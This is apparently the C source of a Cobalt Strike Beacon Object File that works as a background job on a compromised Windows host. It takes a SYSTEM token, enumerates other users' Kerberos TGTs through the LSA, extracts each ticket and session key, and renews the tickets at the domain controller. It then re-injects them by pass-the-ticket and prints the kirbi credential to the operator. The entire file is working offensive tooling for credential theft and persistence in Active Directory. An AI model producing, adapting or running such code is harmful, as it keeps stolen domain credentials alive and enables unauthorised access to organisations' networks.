#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "beacon.h"
#include "common.h"
#include "common.c"
#include "crypto.c"
#include "asn.c"

BOOL IsExpired(PTICKET_ENTRY ticket) {
    LARGE_INTEGER now = { 0 };
    NTDLL$NtQuerySystemTime(&now);
    return now.QuadPart >= ticket->renewUntil.QuadPart;
}

BOOL Expires(PTICKET_ENTRY ticket, int minutes) {
    LARGE_INTEGER now = { 0 };
    NTDLL$NtQuerySystemTime(&now);
    LONGLONG marginTicks = (LONGLONG)minutes * 60 * 10000000LL;
    return (ticket->endTime.QuadPart - now.QuadPart) <= marginTicks;
}

VOID GetDomainController(char** dc){
    if (!dc || *dc != NULL)
        return; 

    PDOMAIN_CONTROLLER_INFOA pDomainControllerInfo = NULL; 
    if(NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pDomainControllerInfo))
        return; 

    char* name = ((char*)pDomainControllerInfo->DomainControllerName) + 2;
    MemCopy((unsigned char**)dc, (unsigned char*)name, MSVCRT$strlen(name) + 1);

    if (pDomainControllerInfo != NULL){
        NETAPI32$NetApiBufferFree(pDomainControllerInfo); 
    }
}

LARGE_INTEGER DateTimeToLargeInteger(DateTime dt) {
    SYSTEMTIME st = { dt.year, dt.month, 0, dt.day, dt.hour, dt.minute, dt.second, 0 };
    FILETIME ft;
    KERNEL32$SystemTimeToFileTime(&st, &ft);
    return (LARGE_INTEGER){ .LowPart = ft.dwLowDateTime, .HighPart = ft.dwHighDateTime };
}

UINT Htonl(UINT hostlong) {
    static const int test = 1;
    if (*((char*)&test) == 1)
        return ((hostlong >> 24) & 0xFF) | ((hostlong >> 8) & 0xFF00) |
               ((hostlong << 8) & 0xFF0000) | ((hostlong << 24) & 0xFF000000);
    return hostlong;
}

VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* response, int* size) {
    WSADATA wsaData;
    int iResult = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to start WSA Winsock: %d\n", iResult);
        return;
    }

    struct addrinfo hints = { 0 };
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = NULL;
    iResult = WS2_32$getaddrinfo(server, port, &hints, &result);
    if (iResult != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get KDC IP info: %d\n", iResult);
        WS2_32$WSACleanup();
        return;
    }

    SOCKET sock = INVALID_SOCKET;
    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        sock = WS2_32$socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create socket: %ld\n", WS2_32$WSAGetLastError());
            WS2_32$freeaddrinfo(result);
            WS2_32$WSACleanup();
            return;
        }
        iResult = WS2_32$connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            WS2_32$closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }
    WS2_32$freeaddrinfo(result);

    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to KDC.\n");
        WS2_32$WSACleanup();
        return;
    }

    // Kerberos TCP framing: 4-byte big-endian length prefix
    UINT networkSize = Htonl(contentSize);
    char lenBuf[4];
    MSVCRT$memcpy(lenBuf, &networkSize, 4);
    WS2_32$send(sock, lenBuf, 4, 0);
    iResult = WS2_32$send(sock, (char*)content, contentSize, 0);
    if (iResult == SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to send data: %d\n", WS2_32$WSAGetLastError());
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return;
    }

    // Read 4-byte response length
    char sizeBuf[4];
    iResult = WS2_32$recv(sock, sizeBuf, 4, 0);
    if (iResult < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to receive response size: %d\n", WS2_32$WSAGetLastError());
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return;
    }

    MSVCRT$memcpy(size, sizeBuf, 4);
    *size = Htonl(*size) & 0x7fffffff;

    *response = MemAlloc(*size);
    if (!*response) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate response buffer\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return;
    }

    // Read full response
    PBYTE buf = *response;
    int received = 0;
    while (received < *size) {
        iResult = WS2_32$recv(sock, (char*)buf, *size - received, 0);
        if (iResult <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to receive response: %d\n", WS2_32$WSAGetLastError());
            WS2_32$closesocket(sock);
            WS2_32$WSACleanup();
            return;
        }
        buf += iResult;
        received += iResult;
    }

    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
}

BOOL CreateTgsReq(char* cname, char* domain, char* sname, Ticket ticket, EncryptionKey clientKey, BYTE** tgsReqBytes, int* tgsReqSize) {
    AS_REQ req = { 0 };

    req.pvno = 5; // Protocol version: 5
    req.msg_type = KERB_TGS_REQ; // Message type: TGS-REQ (12)
    req.req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK | RENEW; // Request options
    req.req_body.till = 24 * 3600;  // Renewed ticket is valid for 24h
    ADVAPI32$SystemFunction036(&req.req_body.nonce, 4); // Generate random 4 bytes nonce (using SystemFunction036 = RtlGenRandom)

    // Set username
    req.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    req.req_body.cname.name_count = 1;
    req.req_body.cname.name_string = MemAlloc(sizeof(void*));
    if (!req.req_body.cname.name_string) return FALSE;
    if (!MemCopy((unsigned char**)&req.req_body.cname.name_string[0], (unsigned char*)cname, MSVCRT$strlen(cname) + 1)) return FALSE;
    if (!MemCopy((unsigned char**)&req.req_body.realm, (unsigned char*)domain, MSVCRT$strlen(domain) + 1)) return FALSE;
    StrToUpper(req.req_body.realm); // Realm needs to be capitalized

    // Set service name
    req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
    req.req_body.sname.name_count = 2;
    req.req_body.sname.name_string = MemAlloc(2 * sizeof(void*));
    if (!req.req_body.sname.name_string) return FALSE;
    if (!MemCopy((unsigned char**)&req.req_body.sname.name_string[0], (unsigned char*)sname, MSVCRT$strlen(sname) + 1)) return FALSE;
    if (!MemCopy((unsigned char**)&req.req_body.sname.name_string[1], (unsigned char*)domain, MSVCRT$strlen(domain) + 1)) return FALSE;

    // Set encryption types
    req.req_body.etypes_count = 4;
    req.req_body.etypes = MemAlloc(sizeof(int) * 4);
    if (!req.req_body.etypes) return FALSE;
    req.req_body.etypes[0] = aes256_cts_hmac_sha1;
    req.req_body.etypes[1] = aes128_cts_hmac_sha1;
    req.req_body.etypes[2] = rc4_hmac;
    req.req_body.etypes[3] = rc4_hmac_exp;

    // Create and set pre-authentication data
    AP_REQ* ap_req = MemAlloc(sizeof(AP_REQ));
    if (!ap_req) return FALSE;
    ap_req->pvno = 5;
    ap_req->msg_type = KERB_AP_REQ;
    ap_req->ap_options = 0;
    ap_req->ticket = ticket; // Set ticket for authentication
    ap_req->keyUsage = KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR;
    ap_req->key = clientKey;

    ap_req->authenticator.authenticator_vno = 5;
    ap_req->authenticator.ctime = GetGmTimeAdd(0);
    if (!MemCopy((unsigned char**)&ap_req->authenticator.crealm, (unsigned char*)domain, MSVCRT$strlen(domain) + 1)) return FALSE;

    ap_req->authenticator.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    ap_req->authenticator.cname.name_count = 1;
    ap_req->authenticator.cname.name_string = MemAlloc(sizeof(void*));
    if (!ap_req->authenticator.cname.name_string) return FALSE;
    if (!MemCopy((unsigned char**)&ap_req->authenticator.cname.name_string[0], (unsigned char*)cname, MSVCRT$strlen(cname) + 1)) return FALSE;

    req.pa_data_count = 1;
    req.pa_data = MemAlloc(sizeof(PA_DATA));
    if (!req.pa_data) return FALSE;
    req.pa_data[0].type = PADATA_AP_REQ;
    req.pa_data[0].value = ap_req;

    // ASN.1 encode TGS-REQ
    AsnElt reqAsn = { 0 };
    if (!ReqToAsnEncode(req, KERB_TGS_REQ, &reqAsn)) return FALSE;
    if (!AsnToBytesEncode(&reqAsn, tgsReqSize, tgsReqBytes)) return FALSE;
    return TRUE;
}

BOOL ParseTgsRep(AsnElt asnResponse, TGS_REP* tgsRep){
    if ((asnResponse.subCount != 1) || asnResponse.sub[0].tagValue != ASN_SEQUENCE){
        BeaconPrintf(CALLBACK_ERROR, "[-] First TGS-REP sub should be a sequence\n");
        return FALSE;
    }

    // Extract KDC-REP fields
    AsnElt* kdc_rep = asnResponse.sub[0].sub;
    for (int i = 0; i < asnResponse.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if (tagValue == 0) { // pvno
            if (!AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgsRep->pvno))) return FALSE;
        }
        if (tagValue == 1) { // msg_type
            if (!AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgsRep->msg_type))) return FALSE;
        }
        if (tagValue == 2) { // padata
            if (!AsnGetPaData(&(kdc_rep[i].sub[0]), &(tgsRep->padata))) return FALSE;
        }
        if (tagValue == 3) { // crealm
            if (!AsnGetString(&(kdc_rep[i].sub[0]), (unsigned char**)&(tgsRep->crealm))) return FALSE;
        }
        if (tagValue == 4) { // cname
            if (!AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(tgsRep->cname))) return FALSE;
        }
        if (tagValue == 5) { // ticket (renewed TGT)
            if (!AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(tgsRep->ticket))) return FALSE;
        }
        if (tagValue == 6) { // enc_part
            if (!AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(tgsRep->enc_part))) return FALSE;
        }
    }
    return TRUE;
}

// Decrypt TGS-REP enc_part, build KRB-CRED (kirbi) for PTT and printing
BOOL BuildTicket(TGS_REP* tgsRep, EncryptionKey sessionKey, BYTE** kirbiBytes, int* kirbiSize, EncKDCRepPart* encRepPartOut) {
    BYTE* decrypted = NULL;
    DWORD decryptedSize = 0;
    if (!decrypt(
        sessionKey.key_value, 
        sessionKey.key_type, 
        KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY,
        tgsRep->enc_part.cipher, 
        tgsRep->enc_part.cipher_size, 
        &decrypted, 
        &decryptedSize
    )) return FALSE;

    AsnElt ae = { 0 };
    if (!BytesToAsnDecode3(decrypted, decryptedSize, FALSE, &ae))
        return FALSE;

    EncKDCRepPart encRepPart = { 0 };
    if (!AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart))
        return FALSE;

    // Build KRB-CRED
    KRB_CRED cred = { 0 };
    cred.pvno = 5;
    cred.msg_type = KERB_CRED_MSG;
    cred.ticket_count = 1;
    cred.tickets = MemAlloc(sizeof(Ticket));
    if (!cred.tickets) return FALSE;
    cred.tickets[0] = tgsRep->ticket;

    KrbCredInfo info = { 0 };

    info.key = encRepPart.key;
    if (!MemCopy(&info.key.key_value, encRepPart.key.key_value, encRepPart.key.key_size)) return FALSE;
    if (!MemCopy((unsigned char**)&info.prealm, (unsigned char*)encRepPart.realm, MSVCRT$strlen(encRepPart.realm) + 1)) return FALSE;

    // Set username
    info.pname.name_type = tgsRep->cname.name_type;
    info.pname.name_count = tgsRep->cname.name_count;
    info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
    if (!info.pname.name_string) return FALSE;
    for (unsigned int i = 0; i < info.pname.name_count; i++)
        if (!MemCopy((unsigned char**)&info.pname.name_string[i], (unsigned char*)tgsRep->cname.name_string[i], MSVCRT$strlen(tgsRep->cname.name_string[i]) + 1)) return FALSE;

    info.flags = encRepPart.flags;
    info.starttime = encRepPart.starttime;
    info.endtime = encRepPart.endtime;
    info.renew_till = encRepPart.renew_till;
    if (!MemCopy((unsigned char**)&info.srealm, (unsigned char*)encRepPart.realm, MSVCRT$strlen(encRepPart.realm) + 1)) return FALSE;

    // Set service name
    info.sname.name_type = encRepPart.sname.name_type;
    info.sname.name_count = encRepPart.sname.name_count;
    info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
    if (!info.sname.name_string) return FALSE;
    for (unsigned int i = 0; i < info.sname.name_count; i++)
        if (!MemCopy((unsigned char**)&info.sname.name_string[i], (unsigned char*)encRepPart.sname.name_string[i], MSVCRT$strlen(encRepPart.sname.name_string[i]) + 1)) return FALSE;

    cred.enc_part.ticket_count = 1;
    cred.enc_part.ticket_info = MemAlloc(sizeof(KrbCredInfo));
    if (!cred.enc_part.ticket_info) return FALSE;
    cred.enc_part.ticket_info[0] = info;

    // ASN.1 encode KRB-CRED 
    AsnElt asnCred = { 0 };
    if (!AsnKrbCredEncode(&cred, &asnCred)) return FALSE;
    if (!AsnToBytesEncode(&asnCred, kirbiSize, kirbiBytes)) return FALSE;
    *encRepPartOut = encRepPart;
    return TRUE;
}

VOID RenewTicket(HANDLE hLsa, ULONG authPackage, PTICKET_ENTRY ticket, char* dc) {
    // Extract and decode Kerberos ticket from PTICKET_ENTRY struct
    PBYTE encodedTicket = NULL;
    ULONG ticketSize    = 0;
    
    WCHAR wspn[256] = { 0 };
    toWideChar(ticket->spn, wspn, sizeof(wspn));
    UNICODE_STRING target = {
        .Buffer = wspn,
        .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
        .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
    };

    if (!NT_SUCCESS(ExtractTicket(hLsa, authPackage, ticket->luid, target, &encodedTicket, &ticketSize))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract ticket.\n");
        return;
    }

    AsnElt asnKrbCred = { 0 };
    KRB_CRED kirbi = { 0 };

    if (!BytesToAsnDecode3(encodedTicket, ticketSize, FALSE, &asnKrbCred) || !AsnGetKrbCred(&(asnKrbCred.sub[0]), &kirbi)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decode ticket.\n");
        return;
    }

    // Load crypto functions
    if (!LoadCryptDll()) return;

    // Create and send TGS-REQ
    PBYTE tgsReqBytes = NULL;
    int tgsReqSize = 0;

    if (!CreateTgsReq(
        kirbi.enc_part.ticket_info[0].pname.name_string[0],
        kirbi.enc_part.ticket_info[0].prealm,
        "krbtgt",
        kirbi.tickets[0],
        kirbi.enc_part.ticket_info[0].key,
        &tgsReqBytes, &tgsReqSize
    )) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create TGS-REQ.\n");
        return;
    }

    PBYTE response = NULL;
    int responseSize = 0;
    SendBytes(dc, "88", tgsReqBytes, tgsReqSize, &response, &responseSize);
    if (responseSize <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No response from %s:88.\n", dc);
        return;
    }

    // Parse TGS-REP
    AsnElt asnResponse = { 0 };
    if (!BytesToAsnDecode3(response, responseSize, FALSE, &asnResponse) || asnResponse.tagValue != KERB_TGS_REP) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid TGS-REP.\n");
        return;
    }

    TGS_REP tgsRep = { 0 };
    if (!ParseTgsRep(asnResponse, &tgsRep)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse TGS-REP.\n");
        return;
    }

    PBYTE kirbiBytes = NULL;
    int kirbiSize = 0;
    EncKDCRepPart encRepPart = { 0 };

    if (!BuildTicket(&tgsRep, kirbi.enc_part.ticket_info[0].key, &kirbiBytes, &kirbiSize, &encRepPart)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build renewed ticket.\n");
        return;
    }

    // Purge old ticket from cache
    KERB_PURGE_TKT_CACHE_REQUEST purgeRequest = { 0 };
    purgeRequest.MessageType = KerbPurgeTicketCacheMessage;
    purgeRequest.LogonId = ticket->luid;
    purgeRequest.ServerName.Buffer = wspn;
    purgeRequest.ServerName.Length = (USHORT)(MSVCRT$wcslen(wspn) * 2);
    purgeRequest.ServerName.MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2);

    PVOID purgeResponse = NULL;
    ULONG purgeResponseSize = 0;
    NTSTATUS purgeProtoStatus = 0;
    SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &purgeRequest, sizeof(purgeRequest), &purgeResponse, &purgeResponseSize, &purgeProtoStatus);
    if (purgeResponse)
        SECUR32$LsaFreeReturnBuffer(purgeResponse);

    // Import renewed ticket (PTT)
    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
    PKERB_SUBMIT_TKT_REQUEST submitRequest = (PKERB_SUBMIT_TKT_REQUEST)MemAlloc(submitSize);
    if (!submitRequest) return;

    submitRequest->MessageType = KerbSubmitTicketMessage;
    submitRequest->KerbCredSize = kirbiSize;
    submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    submitRequest->LogonId = ticket->luid;
    MSVCRT$memcpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, kirbiBytes, kirbiSize);

    PVOID pttResponse = NULL;
    ULONG pttResponseSize = 0;
    NTSTATUS pttProtoStatus = 0;
    NTSTATUS pttStatus = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &pttResponse, &pttResponseSize, &pttProtoStatus);
    MemFree(submitRequest);

    if (!NT_SUCCESS(pttStatus) || !NT_SUCCESS(pttProtoStatus)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to import ticket (0x%08x / 0x%08x)\n", pttStatus, pttProtoStatus);
        if (pttResponse)
            SECUR32$LsaFreeReturnBuffer(pttResponse);
        return;
    }
    if (pttResponse)
        SECUR32$LsaFreeReturnBuffer(pttResponse);

    // Update ticket fields
    ticket->startTime  = DateTimeToLargeInteger(encRepPart.starttime);
    ticket->endTime    = DateTimeToLargeInteger(encRepPart.endtime);
    ticket->renewUntil = DateTimeToLargeInteger(encRepPart.renew_till);
    ticket->ticketFlags = encRepPart.flags;
    ticket->encryptionType = encRepPart.key.key_type;

    // Print renewed ticket
    PrintTicketInformation(ticket, "Renewed TGT");
    PrintTicket(kirbiBytes, kirbiSize);
    BeaconWakeup();
}

VOID go(char* args, int argc) {
    datap parser = { 0 };
    HANDLE hStop = BeaconGetStopJobEvent();

    BeaconDataParse(&parser, args, argc);
    int interval = BeaconDataInt(&parser);
    int threshold = BeaconDataInt(&parser);
    char* targetUsers = BeaconDataExtract(&parser, NULL);
    char* targetLuids = BeaconDataExtract(&parser, NULL); 
    
    if (!IsSystem()) {
        HANDLE hToken = StealSystemToken();
        if (!hToken) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
            return;
        }
        ADVAPI32$SetThreadToken(NULL, hToken);
        KERNEL32$CloseHandle(hToken);
    }
    
    HANDLE hLsa = 0;
    if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
    return;
    
    ULONG authPackage = 0;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    
    char* dc = NULL; 
    GetDomainController(&dc); 
    if(!dc){
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find domain controller.\n");
        return; 
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting automatic TGT renewal (interval: %ds) (threshold: %dmin)\n", interval, threshold);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain Controller : %s\n", dc);
    if (targetUsers && targetUsers[0] != '\0')
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users      : %s\n", targetUsers);
    if (targetLuids && targetLuids[0] != '\0')
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUIDs      : %s\n", targetLuids);
    BeaconPrintf(CALLBACK_OUTPUT, "\n"); 
    BeaconWakeup();

    do {
        TICKET_CACHE curr = { 0 };

        // Retrieve tickets for target users
        if (NT_SUCCESS(EnumerateTGTs(hLsa, authPackage, targetUsers, &curr))) {
            for (int i = 0; i < curr.count; i++) {
                PTICKET_ENTRY ticket = &curr.tickets[i];

                // Filter for target LUID 
                if (targetLuids && targetLuids[0] != '\0' && !IsTargetLuid(targetLuids, ticket->luid))
                    continue; 

                // Check if TGT can be renewed
                if (IsExpired(ticket))
                    continue;

                // Check if TGT expires within <threshold> minutes
                if (Expires(ticket, threshold)) {
                    LARGE_INTEGER now = { 0 };
                    NTDLL$NtQuerySystemTime(&now);

                    // Manual calculation to avoid ___divdi3 import which crashes agent on x86
                    LONGLONG diff = ticket->endTime.QuadPart - now.QuadPart;
                    int remaining = 0; while (diff >= 600000000LL) { diff -= 600000000LL; remaining++; }
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Remaining ticket lifetime below threshold (%d < %dmin).", remaining, threshold);
                
                    RenewTicket(hLsa, authPackage, ticket, dc);
                }
            }
        }

        if (curr.tickets)
            MemFree(curr.tickets);

        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
        if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
            break;

    } while (TRUE);

    SECUR32$LsaDeregisterLogonProcess(hLsa);
    ADVAPI32$RevertToSelf();

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
}
